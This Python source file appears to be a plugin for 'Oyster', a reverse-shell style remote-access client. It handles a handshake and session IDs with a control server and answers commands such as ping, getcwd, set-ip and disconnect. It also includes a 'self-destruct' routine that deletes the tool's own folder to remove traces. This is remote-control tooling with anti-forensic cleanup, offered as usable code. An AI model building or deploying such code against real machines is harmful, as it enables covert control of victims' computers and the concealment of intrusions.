import shlex
import sys
import subprocess
import socket
from time import sleep
from os import getcwd
from shutil import rmtree
from os.path import realpath
from common import LoopEvent


class Plugin(object):
    version = 'v1.0'
    invocation = 'oyster '
    enabled = True
    required = True

    def run(self, client, data):
        args = shlex.split(data)

        if not args:
            client.server_print('Oyster requires arguments to run.\n')
            return

        # Handle the initial handshake.
        if args[0] == 'handshake':
            try:
                uuid = args[1]
            except IndexError:
                print('< No sesssion-id provided. >')
                client.send_data('False')
                return

            if uuid == client.session_id:
                if client.reconnect_to_session:
                    print('< Connecting to session. >')
                    client.send_data('True')
                    client.session_id = uuid
                    return
                print('< Will not connect to current session. >')
                client.send_data('False')
                return
            else:
                client.send_data('True')
                client.session_id = uuid

        if args[0] == 'set-session-id':
            client.set_session_id(args[1])
            return

        if args[0] == 'set-port':
            client.send_data('Port set.')
            client.connected_port = args[1]
            return

        if args[0] == 'get-ip':
            client.send_data(client.ip_address)
            return

        if args[0] == 'set-ip':
            client.send_data('IP set.')
            client.ip_address = args[1]
            return

        if args[0] == 'disconnect':
            client.handle_disconnect()
            return

        # Get the current working directory.
        if args[0] == 'getcwd':
            Plugin.send_data_with_cwd(client, '')
            return

        # Send a `pong` back to the server.
        if args[0] == 'ping':
            client.send_data('pong\n')
            return

        # Cover quit and exit commands.
        if args[0] == 'quit' or args[0] == 'exit':
            client.send_data('confirmed')
            sleep(1)
            return LoopEvent.should_break()

        # Make the `client.py` script remove the `Oyster` folder and its contents.
        if args[0] == 'self-destruct':
            client.server_print('Self-destructing in..', chunks=True)
            client.server_print('5!', chunks=True)
            sleep(1)
            client.server_print('4!', chunks=True)
            sleep(1)
            client.server_print('3!', chunks=True)
            sleep(1)
            client.server_print('2!', chunks=True)
            sleep(1)
            client.server_print('1!', chunks=True)
            sleep(1)
            client.server_print('Boom!')

            Plugin.self_destruct()
            sys.exit()

        return

    @staticmethod
    def self_destruct():
        """
        Destroy self.

        :return:
        """

        filename = __file__.split('/')[-1]
        cd = __file__.split('/')[-2]
        directory = __file__.replace(filename, '').replace(cd + '/', '')
        rmtree(directory)

    @staticmethod
    def send_data_with_cwd(client, some_data):
        """
        Send something back to the control server with the current
        working directory appended to the end of it.

        :param some_data:
        :return:
        """

        client.sock.send(str.encode(some_data + str(getcwd()) + '> ' + '~!_TERM_$~'))
        return
